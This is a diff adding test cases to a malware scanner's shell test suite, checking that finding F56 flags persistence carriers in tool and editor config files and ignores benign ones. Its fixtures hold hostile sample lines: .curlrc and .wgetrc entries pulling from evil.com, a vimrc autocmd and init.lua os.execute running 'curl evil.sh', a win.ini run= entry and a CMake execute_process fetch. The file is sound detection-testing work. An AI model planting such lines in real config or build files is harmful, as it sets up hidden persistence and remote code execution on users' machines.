@@ -8469,6 +8469,54 @@ printf '<?xml version="1.0"?><installer-gui-script><pkg-ref id="a"/></installer-
 ./hlse_core file "$XDIR/clean.dist" 2>&1 | grep -q "F56" \
     && check "file: benign .dist no F56" "0" "1" \
     || check "file: benign .dist no F56" "0" "0"
+# F56: tool default-option + editor/init persistence carriers
+printf 'output = /tmp/evil\nurl = http://evil.com/x\n' > "$XDIR/.curlrc"
+./hlse_core file "$XDIR/.curlrc" 2>&1 | grep -q "F56" \
+    && check "file: .curlrc output+url flagged" "0" "0" \
+    || check "file: .curlrc output+url flagged" "0" "1"
+printf 'progress = bar\n' > "$XDIR/clean.curlrc"
+./hlse_core file "$XDIR/clean.curlrc" 2>&1 | grep -q "F56" \
+    && check "file: benign curlrc no F56" "0" "1" \
+    || check "file: benign curlrc no F56" "0" "0"
+printf 'output_document = /tmp/evil\ninput = http://evil.com/x\n' \
+    > "$XDIR/.wgetrc"
+./hlse_core file "$XDIR/.wgetrc" 2>&1 | grep -q "F56" \
+    && check "file: .wgetrc flagged" "0" "0" \
+    || check "file: .wgetrc flagged" "0" "1"
+printf 'autocmd VimEnter * !curl evil.sh\n' > "$XDIR/.vimrc"
+./hlse_core file "$XDIR/.vimrc" 2>&1 | grep -q "F56" \
+    && check "file: vimrc autocmd flagged" "0" "0" \
+    || check "file: vimrc autocmd flagged" "0" "1"
+printf 'os.execute("curl evil.sh")\n' > "$XDIR/init.lua"
+./hlse_core file "$XDIR/init.lua" 2>&1 | grep -q "F56" \
+    && check "file: init.lua os.execute flagged" "0" "0" \
+    || check "file: init.lua os.execute flagged" "0" "1"
+printf 'set nocompatible\nsyntax on\n' > "$XDIR/clean.vimrc"
+./hlse_core file "$XDIR/clean.vimrc" 2>&1 | grep -q "F56" \
+    && check "file: benign vimrc no F56" "0" "1" \
+    || check "file: benign vimrc no F56" "0" "0"
+mkdir -p "$XDIR/inidir" "$XDIR/inidir2"
+printf 'run=c:\\evil.exe\nload=x.exe\n' > "$XDIR/inidir2/win.ini"
+./hlse_core file "$XDIR/inidir2/win.ini" 2>&1 | grep -q "F56" \
+    && check "file: win.ini run= flagged" "0" "0" \
+    || check "file: win.ini run= flagged" "0" "1"
+printf 'device=c:\\x.sys\nshell=explorer.exe\n' \
+    > "$XDIR/inidir/win.ini"
+./hlse_core file "$XDIR/inidir/win.ini" 2>&1 | grep -q "F56" \
+    && check "file: benign ini no F56" "0" "1" \
+    || check "file: benign ini no F56" "0" "0"
+mkdir -p "$XDIR/cmakedir2" && \
+    printf 'cmake_minimum_required(VERSION 3.0)\nexecute_process(COMMAND curl evil.sh)\n' \
+    > "$XDIR/cmakedir2/CMakeLists.txt"
+./hlse_core file "$XDIR/cmakedir2/CMakeLists.txt" 2>&1 | grep -q "F56" \
+    && check "file: cmake execute_process fetch flagged" "0" "0" \
+    || check "file: cmake execute_process fetch flagged" "0" "1"
+mkdir -p "$XDIR/cmakedir" && \
+    printf 'cmake_minimum_required(VERSION 3.0)\nadd_library(x x.c)\n' \
+    > "$XDIR/cmakedir/CMakeLists.txt"
+./hlse_core file "$XDIR/cmakedir/CMakeLists.txt" 2>&1 | grep -q "F56" \
+    && check "file: benign cmake no F56" "0" "1" \
+    || check "file: benign cmake no F56" "0" "0"
 # F56: credential/session carrier files
 printf '{"log":{"entries":[{"request":{"cookies":[{"name":"s","value":"x"}]}}]}}\n' \
     > "$XDIR/x.har"
